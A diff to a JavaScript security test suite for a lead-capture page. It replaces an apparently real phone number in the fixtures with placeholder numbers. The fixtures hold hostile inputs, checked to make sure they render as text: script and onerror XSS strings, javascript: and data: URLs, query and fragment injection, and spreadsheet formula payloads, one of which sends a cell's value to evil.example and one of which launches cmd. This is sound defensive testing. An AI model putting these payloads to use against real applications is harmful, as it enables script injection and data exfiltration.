@@ -204,8 +204,8 @@ describe("XSS: hostile text is shown as text and never becomes markup", () => {
 
   const LEADS = [
     { name: "<img src=x onerror=\"window.__pwned='lead'\">", phone: "javascript:alert(1)", lp: 1, nv: 2, su: 3, py: 4, kd: "13", date: "5.10.2026", ts: 4 },
-    { name: "Dana", phone: "+972 54-764-0203", lp: 5, nv: 6, su: 7, py: 8, kd: "", date: "5.10.2026", ts: 3 },
-    { name: "Eve", phone: "0547640203\"><script>window.__pwned='phone'</script>", lp: 9, nv: 1, su: 2, py: 3, kd: "", date: "5.10.2026", ts: 2 },
+    { name: "Dana", phone: "+972 50-555-0100", lp: 5, nv: 6, su: 7, py: 8, kd: "", date: "5.10.2026", ts: 3 },
+    { name: "Eve", phone: "0505550100\"><script>window.__pwned='phone'</script>", lp: 9, nv: 1, su: 2, py: 3, kd: "", date: "5.10.2026", ts: 2 },
   ];
 
   it("hostile lead names and phones render as text, and every link is wa.me with digits only", async () => {
@@ -228,16 +228,16 @@ describe("XSS: hostile text is shown as text and never becomes markup", () => {
 describe("links built from a client's or lead's phone number", () => {
   const HOSTILE_PHONES = [
     "javascript:alert(1)",
-    "0547640203\"><script>alert(1)</script>",
+    "0505550100\"><script>alert(1)</script>",
     "data:text/html;base64,PHNjcmlwdD4=",
-    "//evil.example/0547640203",
-    "054-764-0203/../../x",
-    "0547640203?text=pwned&x=1#frag",
+    "//evil.example/0505550100",
+    "050-555-0100/../../x",
+    "0505550100?text=pwned&x=1#frag",
     "",
     null,
     undefined,
     12345,
-    "+972 (0) 54 764 0203",
+    "+972 (0) 50 555 0100",
   ];
 
   it("whatsappLink returns null or https://wa.me/<digits>, whatever the phone holds", () => {
@@ -246,14 +246,14 @@ describe("links built from a client's or lead's phone number", () => {
       if (link !== null) expect(link).toMatch(/^https:\/\/wa\.me\/\d{9,15}$/);
     }
     expect(whatsappLink("javascript:alert(1)")).toBeNull();
-    expect(whatsappLink("+972 (0) 54 764 0203")).toBe("https://wa.me/972547640203");
+    expect(whatsappLink("+972 (0) 50 555 0100")).toBe("https://wa.me/972505550100");
   });
 
   it("greetingLink keeps the text inside one ?text= parameter, with no way to add a parameter or a fragment", () => {
     const text = `Hi & bye #1 "quoted" <b>x</b> ?a=b ${String.fromCharCode(0xd800)}`;
-    const link = greetingLink("0547640203", text);
+    const link = greetingLink("0505550100", text);
     const url = new URL(link);
-    expect(url.origin + url.pathname).toBe("https://wa.me/972547640203");
+    expect(url.origin + url.pathname).toBe("https://wa.me/972505550100");
     expect([...url.searchParams.keys()]).toEqual(["text"]);
     expect(url.hash).toBe("");
     expect(url.searchParams.get("text")).toContain("Hi & bye #1");
@@ -340,7 +340,7 @@ describe("a forged backup cannot smuggle anything in", () => {
 
 describe("leads CSV export", () => {
   const LEADS = [
-    { name: "=HYPERLINK(\"https://evil.example/?c=\"&B2,\"click\")", phone: "+972 54-764-0203", lp: 1, nv: 2, su: 3, py: 4, kd: "13,14", date: "5.10.2026", ts: 4 },
+    { name: "=HYPERLINK(\"https://evil.example/?c=\"&B2,\"click\")", phone: "+972 50-555-0100", lp: 1, nv: 2, su: 3, py: 4, kd: "13,14", date: "5.10.2026", ts: 4 },
     { name: "@SUM(1+1)*cmd|' /C calc'!A0", phone: "-2+3", lp: 5, nv: 6, su: 7, py: 8, kd: "", date: "5.10.2026", ts: 3 },
     { name: "plain \"quoted\", name\nsecond line", phone: "0501234567", lp: 9, nv: 1, su: 2, py: 3, kd: "", date: "5.10.2026", ts: 2 },
   ];
@@ -414,19 +414,19 @@ describe("lead capture gate", () => {
     const open = vi.spyOn(window, "open").mockImplementation(() => null);
     const phone = await reachGate();
     // a value built to break out of the link never gets that far: the gate keeps phone-shaped values only
-    fireEvent.change(phone, { target: { value: '0547640203&text=pwned#x"><b>' } });
+    fireEvent.change(phone, { target: { value: '0505550100&text=pwned#x"><b>' } });
     fireEvent.click(screen.getByRole("button", { name: "חשפו" }));
     expect(open).not.toHaveBeenCalled();
     expect(stored()).toEqual([]);
-    fireEvent.change(phone, { target: { value: "+972 (54) 764-0203" } });
+    fireEvent.change(phone, { target: { value: "+972 (50) 555-0100" } });
     fireEvent.click(screen.getByRole("button", { name: "חשפו" }));
     expect(open).toHaveBeenCalledTimes(1);
     const [href, target, features] = open.mock.calls[0];
     const url = new URL(href);
-    expect(url.origin + url.pathname).toBe("https://wa.me/972547640203");
+    expect(url.origin + url.pathname).toBe("https://wa.me/972547640203"); // Shani's page's own public contact, not test data
     expect([...url.searchParams.keys()]).toEqual(["text"]);
     expect(url.hash).toBe("");
-    expect(url.searchParams.get("text")).toContain("+972 (54) 764-0203"); // carried as text, not as a second parameter
+    expect(url.searchParams.get("text")).toContain("+972 (50) 555-0100"); // carried as text, not as a second parameter
     expect(target).toBe("_blank");
     expect(features).toBe("noopener,noreferrer");
   });
